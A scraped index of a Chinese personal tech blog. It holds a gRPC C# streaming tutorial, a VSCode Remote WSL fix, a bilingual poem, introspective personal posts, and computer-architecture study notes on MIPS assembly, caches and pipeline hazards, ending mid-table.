IServerStreamWriter\u0026lt;Result\u0026gt; result_stream, ServerCallContext context) { while (await operand_stream.MoveNext()) { Operand operand = operand_stream.Current; var res = new Result(); switch (operand.Opr) { case Operator.Add: res.Val = operand.Op1 + operand.Op2; break; case Operator.Sub: res.Val = operand.Op1 - operand.Op2; break; case Operator.Mul: res.Val = operand.Op1 * operand.Op2; break; default: break; } await result_stream.WriteAsync(res); } } }   我们来看上方的代码的特点：\n 为了允许任务的异步执行，我们在返回值中使用Task关键字。 在服务器流式RPC中，我们需要使用异步方法WriteAsync将服务器的响应写入异步流IServerStreamWriter中。 在客户端流式RPC中，我们需要使用异步流IAsyncStreamReader逐个读出请求并进行运算。 在双向流式RPC中，我们需要同时使用IAsyncStreamReader和IServerStreamWriter。  而启用gRPC服务器的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  public static void Main() { try { // 禁止复用端口！！！（SoReuseport 置为 0） Grpc.Core.Server server = new Grpc.Core.Server(new[] { new ChannelOption(ChannelOptions.SoReuseport, 0) }) { Services = { Calculator.BindService(new CalculatorImpl()) }, Ports = { new ServerPort(\u0026#34;127.0.0.1\u0026#34;, 8888, ServerCredentials.Insecure) } }; // 建立监听特定IP地址和端口Server的模板代码 server.Start(); Console.WriteLine(\u0026#34;Server begins to listen!\u0026#34;); Console.WriteLine(\u0026#34;Press any key to stop the server...\u0026#34;); Console.ReadKey(); Console.WriteLine(\u0026#34;Server end!\u0026#34;); server.ShutdownAsync().Wait(); } catch (Exception ex) { Console.WriteLine(ex.ToString()); } }   我们总结一下创建客户端的步骤：\n 创建 Grpc.Core.Server 的一个实例。 创建我们的服务实现类 CalculatorImpl 的一个实例。 通过在 Services 集合中添加服务的定义注册我们的服务实现。 指定想要接受客户端请求的地址和监听的端口。通过往 Ports 集合中添加 ServerPort 即可完成。 在服务器实例上调用 Start 为我们的服务启动一个 RPC 服务器。  Client 首先，我们需要建立一个Client对象：\n1 2 3  Channel channel = new Channel(\u0026#34;127.0.0.1:8888\u0026#34;, ChannelCredentials.Insecure); var client = new Calculator.CalculatorClient(channel); // 建立一个连接到特定host的client // ... Client 的调用操作   在调用单一RPC服务时，我们像调用本地方法那样调用远程方法（UnaryCall），如果RPC成功完成，则返回响应值。\n1 2 3 4 5  // case 1: unary call（单一RPC） Console.WriteLine(\u0026#34;case 1:\u0026#34;); var unaryCall = client.UnaryCall(operand0); //  var unaryCallVal = unaryCall.Val; Console.WriteLine(unaryCallVal);   在调用服务器流式RPC服务时，由于得到的响应是流式的，所以我们需要使用MoveNext方法逐个读取其值。\n1 2 3 4 5 6 7 8  // case 2: streaming from server（服务器流式RPC） Console.WriteLine(\u0026#34;case 2:\u0026#34;); var streamingFromServer = client.StreamingFromServer(operand0); while(await streamingFromServer.ResponseStream.MoveNext()) { var streamingFromServerVal = streamingFromServer.ResponseStream.Current.Val; Console.WriteLine(streamingFromServerVal); }   在调用客户端流式RPC服务时，我们需要使用WriteAsync方法逐个写入请求值，最终使用CompleteAsync方法表示不再请求。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // case 3: streaming from client（客户端流式RPC） Console.WriteLine(\u0026#34;case 3:\u0026#34;); var streamingFromClient = client.StreamingFromClient(); Tuple\u0026lt;int, int, Operator\u0026gt;[] tups = { new(1, 1, Operator.Add), new(5, 6, Operator.Mul), new(3, 4, Operator.Sub), new(0, 0, Operator.NoneOp) }; foreach (var tup in tups) { Operand operand = new Operand(); operand.Op1 = tup.Item1; operand.Op2 = tup.Item2; operand.Opr = tup.Item3; await streamingFromClient.RequestStream.WriteAsync(operand); } await streamingFromClient.RequestStream.CompleteAsync(); var streamingFromClientVal = streamingFromClient.ResponseAsync.Result.Val; Console.WriteLine(streamingFromClientVal);   在调用双向流RPC服务时，我们将请求写入RequestStream，使用ResponseStream获取响应。两者是相互独立的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  // case 4: streaming both ways（双向流RPC） Console.WriteLine(\u0026#34;case 4:\u0026#34;); var streamingBothWays = client.StreamingBothWays(); foreach (var tup in tups) { Operand operand = new Operand(); operand.Op1 = tup.Item1; operand.Op2 = tup.Item2; operand.Opr = tup.Item3; _ = streamingBothWays.RequestStream.WriteAsync(operand); if (!await streamingBothWays.ResponseStream.MoveNext()) { break; } var streamingBothWaysVal = streamingBothWays.ResponseStream.Current.Val; Console.WriteLine(streamingBothWaysVal); }   运行结果如下：\n参考与荐读 由于时间所限，有很多有趣的内容我们没有涉及：\n 计算机网络模型 RPC的生命周期 在gRPC中使用安全认证和通讯协议 \u0026hellip;  略过上述内容不会对我们的教学产生太大影响，感兴趣的同学可以参考以下文档和资源：\n 计算机网络——自顶向下方法 Stanford CS144 gRPC 官方文档  ","date":"2022-06-20T19:55:32+08:00","permalink":"https://ther-nullptr.github.io/posts/programming/grpc/","title":"grpc"},{"content":"chapter 1 是谁把这些星星撒过天空\n像闪光的尘埃\n像发光的云\n他们将乳白色的光芒\n倒入深黑色的碗中\nWho spilled those stars across the sky\nlike sparkling dust\nlike clouds of light?\nThey pour their milky shine\ninto the deep black bowl\nchapter 2 我是我所行走的世界\n我所见所闻所感都来自我自己\nI was the world in which I walked\nand what I saw or heard or felt\ncame not but from myself\nchapter 3 大理石永久幻化成一个灵魂\n孤独地航行在陌生的\n思想海洋中\nThe marble index of a mind forever\nVoyaging through strange seas of thought, alone\nchapter 4 现在我用沉静的目光见到\n恰是那台机器脉冲的颤跳\nAnd now I see with eye serene\nThe very pulse of the machine\n","date":"2022-06-19T20:55:58+08:00","image":"https://ther-nullptr.github.io/posts/ldr/LDR_hu8eb093704b9dd0a9c9f2f554fd593af3_2854661_120x120_fill_q75_box_smart1.jpg","permalink":"https://ther-nullptr.github.io/posts/ldr/","title":"Love Death Robots"},{"content":"  打开wsl，输入以下指令：\n1  $ VSCODE_WSL_DEBUG_INFO=true code .   此时terminal会输出调试信息：\n此时所执行的脚本路径为~//.vscode//extensions//ms-vscode-remote.remote-wsl-0.xx.x//scripts//wslDownload.sh(On Windows)。定位程序发生卡死的位置：\n将该程序的第110行（或临近位置，带tar的那行）删掉：\n手动下载，并解压该文件，将其名称改为其SHA-1值。然后移动到~/.vscode-server/bin/中：\n成功解决！\n  ","date":"2022-06-19T19:10:59+08:00","permalink":"https://ther-nullptr.github.io/posts/awesome_toolkits/wsl_remote/","title":"解决VSCode更新后无法启动Remote WSL的问题"},{"content":"Q 现实世界或许不坏，可是我讨厌自己。\nA 你认为现实不好，所以心生厌恶。\nA 是你的内心把现实和真实对调了。\nA 只要看现实的角度和切入点稍有不同，心里就会有很大的变化。\nA 有多少种人就有多少种真实。\nA 但是，你自己的真实只有一个。它由狭义的世界观而生，是为了保护自己而修改过的信息。是被歪曲过的真实。\nA 不过仅有一个人所持的世界观是微不足道的。\nA 可是人只能用自己渺小的基准来测量事物，只愿意用别人给予的真实去看待事物。\nA 晴天使人快乐，雨天使人忧郁，被人这样教导之后就深信不疑。\nA 雨天也会有快乐的事，接受的方式不同就会产生完全不同的结果。人内心的真实，还真是脆弱啊。\nA 人的真实不过仅此而已，所以才会想要知道更深层的真实。\nA 只是，你不习惯被人喜欢罢了。\nA 所以你没有必要总是看别人的脸色。\nQ 但，大家不是都讨厌我吗？\nA 你是笨蛋吗？这只是你自己钻牛角尖而已。\nQ 可是，我讨厌自己。\nA 讨厌自己的人是无法喜欢和信赖他人的。\nQ 我悲怯，胆小，狡猾，懦弱。\nA 理解自己后，就可以对自己温柔一点了吧。\nQ 我讨厌自己，不过，也有可能会喜欢上自己。或许，我可以呆在这里。没错，我就是我自己。我就是我，我想做自己，我想呆在这里，我可以呆在这里！\n","date":"2022-06-19T19:09:43+08:00","permalink":"https://ther-nullptr.github.io/posts/small_talk/eva2/","title":"每日一遍"},{"content":" 给您跪了。\n 自己的负面情绪，真的已经外溢到如此严重的地步了吗？\n或者说，这种网抑云式的生活状态，本身就是不可理喻的吗？\n","date":"2022-06-15T23:59:43+08:00","permalink":"https://ther-nullptr.github.io/posts/small_talk/%E6%97%A0%E9%A2%98/","title":"外溢"},{"content":"优秀stack站点记录 zhixuan\u0026rsquo;s Blog\n相忘于江湖\nHome\n一笼虾饺有四个\n","date":"2022-06-15T00:24:11+08:00","permalink":"https://ther-nullptr.github.io/posts/awesome_toolkits/websites/","title":"Websites"},{"content":"多周期CPU 多周期数据通路     R lw or sw beq J     IF PC\u0026lt;=PC+4; IR \u0026lt;=MemInst[PC]; * * *   ID opcode\u0026lt;=IR[31:26]; A\u0026lt;=Reg[IR[25:21]]; B\u0026lt;=Reg[IR[20:16]]; ALUOut\u0026lt;=PC+(signext(IR[15:0]\u0026laquo;2)) * * *   EX ALUOut \u0026lt;= A op B ALUOut\u0026lt;=A+sign-ext(IR[15:0]) if (A=B)PC\u0026lt;=ALUOut PC \u0026lt;= {PC[31:28],IR[25:0],2’b00}   MEM Reg[IR[15:11]]\u0026lt;=ALUOut Lw:MDR\u0026lt;=MemData[ALUOut];Sw:MemData[ALUout] \u0026lt;=B     WB  Reg[IR[20:16]]\u0026lt;=MDR      重点控制信号的周期：\n IRWrite：在Instruction fench阶段被置为1，但在lw的Memory access阶段被置为0，因为在lw的Register writeback阶段，Instruction Register不能再更新，如果更新的话，会被读出的数据覆盖。 MemRead：在Instruction fench阶段被置为1（用于读取指令），在Instruction decode阶段为0，在lw的Memory access阶段被置为1。 MemWrite：默认0，在sw的Memory access阶段被置为1。 ALUSrc1：在Instruction fench阶段为00（PC），在Execution阶段根据实际情况修改。 ALUSrc2：在Instruction fench阶段为01（4），在Instruction decode阶段为11（imm\u0026laquo;2），在Execution阶段根据实际情况修改。 PCWrite：在Instruction fench阶段为1（PC\u0026lt;=PC+4），在Instruction decode阶段为0，此后若执行跳转类指令则被置为1。 PCSource：默认为00（PC\u0026lt;=PC+4），在Execution阶段视情况改变。 IorD：默认0（取指令），在Memory access阶段被置为1。 PCWriteCond：在beq的Execution阶段被置为1。 MemtoReg：默认00。 RegDst：默认00。 RegWrite：默认0，在jal和jalr以及Register writeback中被置为1。 ExtOp：在Instruction decode阶段被置为1，因为需要算跳转地址。 ALUOp：在Instruction fench和Instruction decode均为00，因为需要执行加法操作；R type被置为10，beq被置为01。  多周期异常和中断处理 异常指内部不可预知事件（溢出，同步），中断指外部不可预知事件（I/O，异步）。\n简单起见，假设我们需要处理两种异常：1)未定义指令的执行 2)算术溢出，异常处理程序的入口为0x80000180。\n我们需要添加2个寄存器：\n EPC Register：保存受影响的指令的地址。注意写入EPC的地址应该为PC-4。 Cause Register：记录产生异常事件原因。此处0为未定义指令，1为算术溢出。  4个控制信号：\n EPCWrite：EPC写入使能，在触发异常/中断时被置为1。 CauseWrite：Cause写入使能。 PCSource：增加0x80000180。 IntCause：异常原因选择信号。  异常处理的步骤大致如下：\n  异常检测。通过检测 ALU 的溢出信号，判断是否发生溢出异常。\n  保存现场。在异常程序计数器（Exception Program Counter，EPC）中保存出错的指令地址。\n  跳转到异常处理程序。通过修改程序计数器（PC）的值，使得处理器进入异常处理程序。\n  异常/中断处理程序采取操作，比如可以执行对溢出情况实现定义的一些操作，或者终止程序运行并报告。在异常处理完成后，异常处理程序可以选择终止程序，也可以根据 EPC 存储的指令地址恢复并继续执行程序。\n  ","date":"2022-06-04T11:43:15+08:00","permalink":"https://ther-nullptr.github.io/posts/digital_logic_and_processors/multicycle_cpu/","title":"Multicycle CPU"},{"content":"控制信号常见答疑 About Extop https://stackoverflow.com/questions/55290060/what-does-extend-immediate-to-32-bits-mean-in-mips\nI-type instructions with 16-bit immediates are different.\n addi / addiu immediates are sign-extended (by duplicating the top/sign bit of the immediate to all higher bits). https://en.wikipedia.org/wiki/Two%27s_complement#Sign_extension This allows 2\u0026rsquo;s complement numbers from -2^15 .. +2^15-1 to be encoded. (0xFFFF8000 to 0x00007FFF) ori/andi/xori boolean immediates are zero-extended (by setting all higher bits to zero) This allows unsigned / 2\u0026rsquo;s complement numbers from 0 .. 2^16-1 to be encoded. (0x00000000 to 0x0000FFFF)  For other instructions see this [instruction-set reference](https://web.cse.ohio-state.edu/~crawfis.3/cse675-02/Slides/MIPS Instruction Set.pdf) which breaks down each instruction showing 016 || [I15..0] for zero-extension or [I15]16 || [I15..0] for sign-extension.\nAnd usually you don\u0026rsquo;t want to raise an exception on signed overflow, so normally compilers use addu / addiu even on signed integers. addiu is badly named: it\u0026rsquo;s not \u0026ldquo;for unsigned integers\u0026rdquo;, it\u0026rsquo;s just a wrapping-allowed / never-faulting version of add/addi. It sort of makes sense if you think of C, where signed overflow is undefined behaviour (and thus could use add and raise an exception in that case if the compiler wanted to implement it that way), but unsigned integers have well-defined overflow behaviour: base 2 wraparound.\n可以为X的控制信号  控制数据来源的信号（RegDst，MemtoReg）等，不需要用到时可以为X。 控制是否执行某操作（RegWrite）等，必须为0/1。  ","date":"2022-06-04T10:34:25+08:00","permalink":"https://ther-nullptr.github.io/posts/digital_logic_and_processors/control_signal/","title":"CPU中的控制信号"},{"content":"处理器 处理器架构  普林斯顿架构：存储器同时存储指令和其他数据 哈佛架构：数据存储和指令存储分开  处理器性能 执行时间 = 指令数 x CPI x 时钟周期\n或： $$ CPI = CPI_1\\times p_1+\u0026hellip;+CPI_n\\times p_n $$ 性能提升方法：\n 优化编译技术（减少指令数） 快速电路技术或更为先进的电路结构（减少时钟周期）  寄存器 VS 存储器  寄存器：以编号进行访问，可同时访问不同寄存器。 存储器：以地址进行访问，不可同时访问不同地址，相邻数据的地址相差4字节。  数据单位约定 在32位MIPS中，1 word = 4 bytes = 32 bits，相邻数据的地址相差4字节。\n1 2 3 4 5 6 7 8 9 10 11  #include\u0026lt;stdio.h\u0026gt;int main() { printf(\u0026#34;%d\\n\u0026#34;,sizeof(int)); // 4  printf(\u0026#34;%d\\n\u0026#34;,sizeof(char)); // 1  printf(\u0026#34;%d\\n\u0026#34;,sizeof(unsigned int)); // 4  printf(\u0026#34;%d\\n\u0026#34;,sizeof(long int)); // 8  printf(\u0026#34;%d\\n\u0026#34;,sizeof(long long int)); // 8  printf(\u0026#34;%d\\n\u0026#34;,sizeof(float)); // 4  printf(\u0026#34;%d\\n\u0026#34;,sizeof(double)); // 8 }   MIPS汇编指令 汇编优化相关问题   算数\u0026amp;逻辑指令11bit冗余能否利用起来？\n额外11bit用于移位量\u0026amp;功能码。好处：寄存器算术操作只占用一种操作码，指令集可以使用其他操作码支持更多种指令。\n  分支可能的地址范围有32位，如何用16bit表示？\n采用基址+偏移地址的寻址方式。\n addr \u0026laquo; 2：将直接地址转换为字节地址。\n   带立即数的分支指令立即数如何编码？\nMIPS没有带立即数的分支指令，使用比较指令(slti、sltiu等）+ 分支指令组合实现。\n  访存可能的地址有32位，如何用21bit表示？\n采用基址+偏移地址的寻址方式进行访存（5 bit：寄存器 16 bit：立即数）。\n  跳转可能的地址有32位，如何用26bit表示？\nj小范围，jr大范围。\n  寻址方式  寄存器寻址：找到对应的寄存器，从寄存器中取数/写数。如：R type(add)。 立即数寻址：指令中的立即数可以被直接使用。如：I type(addi) 基址寻址：目标地址=基址（存储于寄存器中）+ 立即数。如：lw,sw PC相对寻址：PC+立即数。如：beq 伪直接寻址：固定PC的高4位不变。如：j  MIPS过程调用   Preserved（子程序不改变这些寄存器的数据，如果子程序要用，需要子程序维护好）\n  Not Preserved（子程序可以改变这些寄存器的数据，如果主程序要用，需要主程序维护好）\n  考虑以下汇编：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  fact: addi $sp, $sp, -8 sw $ra, 4($sp) sw $a0, 0($sp) slti $t0, $a0, 1 beq $t0, $zero, L1 addi $v0, $zero, 1 addi $sp, $sp, 8 jr $ra L1: addi $a0, $a0, -1 jal fact lw $a0, 0($sp) lw $ra, 4($sp) addi $sp, $sp, 8 mul $v0, $a0, $v0 jr $ra   对应：\n1 2 3 4 5  int fact(int n) { if (n \u0026lt; 1) return 1; else return (n * fact(n-1)); }   ","date":"2022-06-03T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/digital_logic_and_processors/assembly/","title":"MIPS汇编语言"},{"content":"Memory RAM random access是指该存储器的所有内容都可以被读取和写入，且与时间和位置无关。\n    SRAM DRAM     中文名 静态随机访问存储器 动态随机访问存储器   速度 快 慢（需要读取内容后刷新、定期刷新）   结构 由MOS管组成的锁存器（6T） 由MOS管和电容实现（1T1C）   容量 小 大   应用 缓存 主存   访问时间 1~10ns 10~100ns    常见问答：\n  DRAM电容量C的权衡：\n 大电容容量C的优势：提供更长的数据保持时间 大电容容量C的劣势：工艺实现难度加大，密度降低    RAS和CAS均为低电平有效，其中CAS可以作为输出使能信号。\n  cache 原理 存储系统满足局部性原理：\n 时间局部性——最近的将来要用到的信息很可能就是现在正在使用的信息。主要由循环造成。 空间局部性——最近的将来要用到的信息很可能与现在正在使用的信息在空间上是邻近的。主要由顺序执行和数据的聚集存放造成。  cache的访问时间 一级cache（$r$为访问时间比，$e$为访问效率）： $$ T_A=T_{A1}+(1-H)T_{A2}\\ r=\\frac{T_{A2}}{T_{A1}}\\ e=\\frac{T_{A1}}{T_A} = \\frac{1}{1+(1-H)r} $$ 二级cache： $$ T_A=T_{A1}+(1-H_1)[T_{A2}+(1-H_2)T_{A3}] $$\ncache的基本结构 需要解决两个问题：\n 数据是否在cache中？ 如果在cache中，如何找到数据？  首先需要指出主存存储和cache存储的格式：\n 主存存储 主存块号+行内地址 cache存储 （标签）+cache行号+行内地址  每个主存块和每个cache行储存的数据相同，两者的数据传输以块/行为单位。其中每个cache行的组成如下：数据+标签+有效位。\ncache地址映像方式 三种地址映像方式：\n 直接映像: 主存块只可能在cache的某个特定行中 全相联映像: 主存块可以放在cache的任意行中 组相联映像: 主存块可以放在cache中的n个特定行中，n一般在2到8之间，将这n个行称为一个Cache组。  直接映像 主存标号$i$，cache标号$j$满足以下关系： $$ j = i \\mod N \\ i = j+Nk(k=0,1..) $$ 可以直接写成AB、AC，但是只适用于直接映像。\n对于32位内存系统，假设cache每行有$x$byte，cache共$y$行，则低$\\log_2x$位为块内地址，中间$\\log_2y$位为cache行号，剩下$(32-\\log_2x-\\log_2y)$位为主存标签。\n在这种情况下，由于每行cache的数据有$4x$bit，还有1 bit有效位，所以cache的实际总位数为： $$ y[4x+1+(32-\\log_2x-\\log_2y)] $$ 注意到cache每行至少储存1个word，所以$x$一定是4的倍数，地址的后两位一定是0。载入cache数据时仍然以word为单位进行载入。\n全相联映像 对于32位内存系统，假设cache每行有$x$byte，则低$\\log_2x$位为块内地址，剩下$(32-\\log_2x)$位作为主存标签。\n组相联映像 对于32位内存系统，假设cache每行有$x$byte，cache共$y$行，$z$路组相连，则低$\\log_2x$位为块内地址，中间$\\log_2(\\frac{y}{z})$位作为cache组号，剩下$(32-\\log_2x-\\log_2(\\frac{y}{z}))$位作为主存标签。\n直接映像为$z=1$，全相联映像为$z=y$。\ncache数据替换 每个cache行有一个有效标志位v，表明“这一行的主存数据副本是有效的”。v=1时cache行才能被命中。\n 复位、刚上电或清空cache时，所有行的v=0。 cache行刚刚被替换时，对应行的v=1。  当访问一个地址发现其不在cache中时，复制主存块到缓存的行中；当主存块对应的cache行均被占用（有效位为1）时，需要选择一个cache行进行替换。\n 直接映像 只有一行可以被替换，不用选 组相联/全相联  随机法(Random)：在cache中随机选择一个主存块 先进先出法(FIFO, First-In First-Out)：选择一个集合中最先进入cache中的主存块(即存在时间最长的块)，类似于数据结构中的队列。 最近最少使用法(LRU, Least recently used)：替换cache中最近最少被使用的主存块    cache数据更新 当需要向层次结构存储器写入数据时，需要考虑将数据存入cache还是主存的问题。\nwrite through 指高速缓存和主存都写入。\nwrite back 先将数据写入Cache中，之后在该块要被替换出Cache时才将数据写到主存储器中。\n在cache中会添加一个脏位（dirty bit）。脏位为1意味着cache里面的数据是更新后的，而主存储器里面的数据是过时的。不一致的数据在被替换时一定要写回主存中。\n    Write Through Write Back      既写到cache同时也更新主存储器 只写cache，当数据被替换出cache时才将写回到主存储器    慢 快   被替换是否会导致写操作 No Yes   重复的写操作是否重复写主存 Yes No    cache性能评估  强迫性缺失：第一次访问主存储器中的某一个数据块，只能先从主存储器将数据加载到cache中。 容量缺失：由于cache容纳不了程序所需的所有主存块而引起的缺失。 冲突缺失：在组相联或者直接映像中，多个的主存块竞争同一个cache组时引起的缺失，也称碰撞缺失。  ","date":"2022-05-31T19:22:17+08:00","permalink":"https://ther-nullptr.github.io/posts/digital_logic_and_processors/memory/","title":"Cache"},{"content":"流水线计算公式 $n$为指令数，$k$为流水线级数，级间延时$\\Delta t$。\n实际吞吐率（单位时间内流水线处理的指令数）： $$ TP=\\frac{n}{(k+n-1)\\Delta t} $$ 最大吞吐率： $$ TP_{max} = \\frac{1}{\\Delta t} $$ 实际加速比： $$ S = \\frac{kn}{k+n-1} $$ 最大加速比： $$ S_{max}=k $$\n流水线中控制信号的流动 控制信号在IF之后的ID/RF阶段产生。\n ID/RF：Extop EX：ALUSrc、ALUOp、RegDst？？ MEM：MemWrite、Branch WB：MemToReg、RegWrite  流水线中的冒险 首先列出未冒险时流水线CPU在各步中进行的操作：\n    R lw or sw beq J     IF PC\u0026lt;=PC+4; IR \u0026lt;=MemInst[PC] * * *   ID opcode\u0026lt;=IR[31:26]; A\u0026lt;=Reg[IR[25:21]]; B\u0026lt;=Reg[IR[20:16]]; ALUOut\u0026lt;=PC+(signext(IR[15:0]\u0026lt;\u0026lt;2)) * * PC \u0026lt;= {PC[31:28],IR[25:0],2’b00}   EX ALUOut \u0026lt;= A op B ALUOut\u0026lt;=A+sign-ext(IR[15:0]) if (A=B)PC\u0026lt;=ALUOut    MEM Reg[IR[15:11]]\u0026lt;=ALUOut Lw:MDR\u0026lt;=MemData[ALUOut];Sw:MemData[ALUout] \u0026lt;=B     WB  Reg[IR[20:16]] \u0026lt;=MDR      结构冒险 problem 流水线处理器中直接取消了InstMemory和DataMemory混用的做法，因此不必担心存储器访问的冲突。\n ALU使用冲突。考虑下列指令：  1 2  add $t0,$t1,$t2 beq $a0,$a1,label   当add指令执行完EX时，beq指令执行完ID，ALU产生冲突的结果。\n寄存器堆写入冲突。考虑下列指令：  1 2  lw $a0,0($t0) add $t0,$t1,$t2   当add指令执行完MEM时，lw指令执行完WB，寄存器写入数据产生冲突的结果。\nsolution   ALU使用冲突：\nbeq指令原先需要进行两次计算操作：1)在ID阶段计算分支地址 2)在EX阶段作差比较，更新PC。\n现在需要将计算分支地址移动到EX阶段，把ALUOut计算分解为ALU和PCAdd（一个周期进行两次计算），在MEM阶段更新PC。\n  寄存器堆写入冲突：\n将R型的Write back移动到WB阶段。\n  更新后的操作如下：\n    R lw or sw beq J     IF PC\u0026lt;=PC+4; IR \u0026lt;=MemInst[PC]; * * *   ID opcode\u0026lt;=IR[31:26]; A\u0026lt;=Reg[IR[25:21]]; B\u0026lt;=Reg[IR[20:16]]; * * PC \u0026lt;= {PC[31:28],IR[25:0],2’b00}   EX ALUOut \u0026lt;= A op B ALUOut\u0026lt;=A+sign-ext(IR[15:0]) ALUOut\u0026lt;=A-B; PCAdd\u0026lt;=PC+(signext(IR[15:0]\u0026lt;\u0026lt;2))    MEM  Lw:MDR\u0026lt;=MemData[ALUOut]; Sw:MemData[ALUout] \u0026lt;=B if(Zero) PC\u0026lt;=PCAdd    WB Reg[IR[15:11]]\u0026lt;=ALUOut Reg[IR[20:16]] \u0026lt;=MDR      数据冒险 无法得到所需的数据而导致不能执行后续指令。数据冒险面对的是操作数是否已经更新的问题。\n    R lw or sw beq J     IF PC\u0026lt;=PC+4; IR \u0026lt;=MemInst[PC]; * * *   ID opcode\u0026lt;=IR[31:26]; A\u0026lt;=Reg[IR[25:21]]; B\u0026lt;=Reg[IR[20:16]]; * * PC \u0026lt;= {PC[31:28],IR[25:0],2’b00}   EX ALUOut \u0026lt;= A op B ALUOut\u0026lt;=A+sign-ext(IR[15:0]) ALUOut\u0026lt;=A-B; PCAdd\u0026lt;=PC+(signext(IR[15:0]\u0026lt;\u0026lt;2))    MEM  Lw:MDR\u0026lt;=MemData[ALUOut]; Sw:MemData[ALUout] \u0026lt;=B if(Zero) PC\u0026lt;=PCAdd    WB Reg[IR[15:11]]\u0026lt;= ALUOut Reg[IR[20:16]] \u0026lt;= MDR      Read after write data hazards(RAW) 硬件优化 考虑以下指令：\n1 2  add $r1,$r2,$r3 add $r2,$r1,$r3   before:\n               add $r1,$r2,$r3 IF ID EX MEM WB     nop          nop          add $r2,$r1,$r3    IF ID EX MEM    注意到第一条指令在WB阶段将结果写回寄存器（注意已经不是MEM阶段了！），而第二条指令在ID阶段读取寄存器。可以不修改数据通路，但是需要保证寄存器先写后读（否则需要阻塞3个周期）。\n 实现方法：\n 流水线上的寄存器在上升沿时写入，在时钟的下降沿写入寄存器堆。 比较写入地址和读取地址，当两者相同且要写入寄存器堆时，读取端的数据直接选择为写入端的数据而不从寄存器堆中读取。   Forward(转发) 考虑以下指令：\n1 2 3  add $r1,$r2,$r3 sub $r4,$r1,$r5 and $r6,$r1,$r7   after:\n               add $r1,$r2,$r3 IF ID EX MEM WB     sub $r4,$r1,$r5  IF ID EX MEM WB    and $r6,$r1,$r7   IF ID EX MEM WB    指令1在WB阶段写入r1寄存器，但指令2、3在ID阶段就要用到r1。不过实际上在指令的EX阶段该数值就已经计算完毕，需要在指令2、3的EX阶段用到。\n对于指令2，EX的操作数来源于EX/MEM.ALUOut；对于指令3，EX的操作数来源于MEM/WB.ALUOut；\nLoad-use data hazard(lw-calculate type) Forward 考虑以下指令：\n1 2 3  lw $r1,100($r2) sub $r4,$r1,$r5 and $r6,$r1,$r7   before:\n               lw $r1,100($r2) IF ID EX MEM WB     nop          nop          sub $r4,$r1,$r5    IF ID EX MEM   and $r6,$r1,$r7     IF ID EX    after:\n               lw $r1,100($r2) IF ID EX MEM WB               sub $r4,$r1,$r5   IF ID EX MEM WB   and $r6,$r1,$r7    IF ID EX MEM    lw后r1的新值在MEM阶段后产生，随后被转发至MDR（注意此处的MDR与多周期中的MDR不同，此处的MDR应该是MEM/WB的一部分）中，在下个周期供sub的EX阶段使用。\n上述方法必须使用一次stall，可以重排指令，在lw之后运行一条不依赖r1寄存器的指令。\n更新后的操作如下：\n    R lw or sw beq J     IF PC\u0026lt;=PC+4; IR \u0026lt;=MemInst[PC]; * * *   ID opcode\u0026lt;=IR[31:26]; A\u0026lt;=Reg[IR[25:21]]; B\u0026lt;=Reg[IR[20:16]]; * * PC \u0026lt;= {PC[31:28],IR[25:0],2’b00}   EX ALUOut \u0026lt;= A op B; (Register,EX/MEM.ALUOut,MEM/WB.ALUOut,MDR) ALUOut\u0026lt;=A+sign-ext(IR[15:0]); (Register,EX/MEM.ALUOut,MEM/WB.ALUOut,MDR) ALUOut\u0026lt;=A-B; PCAdd\u0026lt;=PC+(signext(IR[15:0]\u0026laquo;2))    MEM  Lw:MDR\u0026lt;=MemData[ALUOut]; Sw:MemData[ALUout] \u0026lt;=B if(Zero) PC\u0026lt;=PCAdd    WB Reg[IR[15:11]]\u0026lt;=ALUOut Reg[IR[20:16]] \u0026lt;=MDR      Load-use data hazard(lw-sw type) 考虑以下指令：\n1 2  lw $a0,10($a1) sw $a0,10($a2)   before\n               lw $a0,10($a1) IF ID EX MEM WB     nop          sw $a0,10($a2)   IF ID EX MEM WB    after\n               lw $a0,10($a1) IF ID EX MEM WB     sw $a0,10($a2)  IF ID EX MEM WB     lw在MEM阶段结束后更新a0的值，此时可以直接转发给sw，以供在下一时钟周期存入存储器。\n 注意与以下情景做区分：\n1 2  lw $t4, 0($t0) sw $t0, 0($t4)   这就不是lw-sw type了，解决方案见lw-calculate type。\n 控制冒险 取到的指令可能不是所需要的，导致指令不能在预定的时钟周期内执行。控制冒险面对的是下一条指令的PC是多少的问题。\n    R lw or sw beq J     IF PC\u0026lt;=PC+4; IR \u0026lt;=MemInst[PC]; * * *   ID opcode\u0026lt;=IR[31:26]; A\u0026lt;=Reg[IR[25:21]]; B\u0026lt;=Reg[IR[20:16]]; * * PC \u0026lt;= {PC[31:28],IR[25:0],2’b00}   EX ALUOut \u0026lt;= A op B; (Register,EX/MEM.ALUOut,MEM/WB.ALUOut,MDR) ALUOut\u0026lt;=A+sign-ext(IR[15:0]); (Register,EX/MEM.ALUOut,MEM/WB.ALUOut,MDR) ALUOut\u0026lt;=A-B; PCAdd\u0026lt;=PC+(signext(IR[15:0]\u0026laquo;2))    MEM  Lw:MDR\u0026lt;=MemData[ALUOut]; Sw:MemData[ALUout] \u0026lt;=B(B,MEM/WB.MemReadData) if(Zero) PC\u0026lt;=PCAdd    WB Reg[IR[15:11]]\u0026lt;=ALUOut Reg[IR[20:16]] \u0026lt;=MDR      beq hazard 考虑如下指令：\n1 2  beq $t1,$t2,0x10 add $a3,$a2,$a1   before:\n               beq $t1,$t2,0x10 IF ID EX MEM WB     nop          nop          nop          add $a3,$a2,$a1     IF ID EX    beq在MEM阶段才执行跳转，在WB阶段将目标地址写入PC，写入PC后下一条指令在IF阶段取用PC，默认情况下需要stall 3个周期，否则下一条指令执行可能会发生错误。\n但实际上判断是否需要跳转的所有条件在EX阶段执行后就可以全部掌握，可以将ALUOut转发的结果转发至IF，这样只需要stall 2个周期。\nafter(v1):\n               beq $t1,$t2,0x10 IF ID EX MEM WB     nop          nop          add $a3,$a2,$a1    IF ID EX MEM    实际上，也可以将分支判断移动到ID阶段：\n    R lw or sw beq J     IF PC\u0026lt;=PC+4; IR \u0026lt;=MemInst[PC]; * * *   ID opcode\u0026lt;=IR[31:26]; A\u0026lt;=Reg[IR[25:21]]; B\u0026lt;=Reg[IR[20:16]]; * if(A==B) PC\u0026lt;=PC+(signext(IR[15:0]\u0026laquo;2)) PC \u0026lt;= 